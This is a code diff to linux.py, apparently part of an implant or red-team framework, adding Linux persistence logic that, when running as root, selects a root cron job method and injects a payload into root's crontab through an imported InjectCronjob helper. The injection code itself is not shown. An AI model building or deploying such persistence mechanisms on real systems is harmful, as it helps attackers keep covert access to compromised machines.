@@ -3,7 +3,8 @@ linux.py: Linux-specific persistence logic.
 """
 
 from .base import Persistence
-
+from .linux_utilities.persistence_methods import LinuxPersistenceMethods
+from .linux_utilities.rootCronJob import InjectCronjob
 
 class LinuxPersistence(Persistence):
     """
@@ -22,19 +23,29 @@ class LinuxPersistence(Persistence):
         self.temp_dir
         self.recommended_method
 
-        super().__post_init__()
+        super().__post_init__()                 # called to find the recommended persistence method.
 
 
     def _determine_recommended_persistence_method(self) -> str:
-        # TODO: Remove this line when the method is implemented.
+
+        if self.identifier == 0:
+            return LinuxPersistenceMethods.ROOTCRONJOB.value
+
         return super()._determine_recommended_persistence_method()
 
 
     def supported_persistence_methods(self) -> list:
-        # TODO: Remove this line when the method is implemented.
-        return super().supported_persistence_methods()
+        
+        methods = [method.value for method in LinuxPersistenceMethods]
+        
+        return methods
 
 
     def install(self) -> None:
-        # TODO: Remove this line when the method is implemented.
-        super().install()
+        method = self.configured_persistence_method()
+
+        if method == LinuxPersistenceMethods.ROOTCRONJOB.value:
+            InjectCronjob(self.payload).injectRoot()
+            return
+
+        # raise NotImplementedError(f"Method {method} not implemented.") 
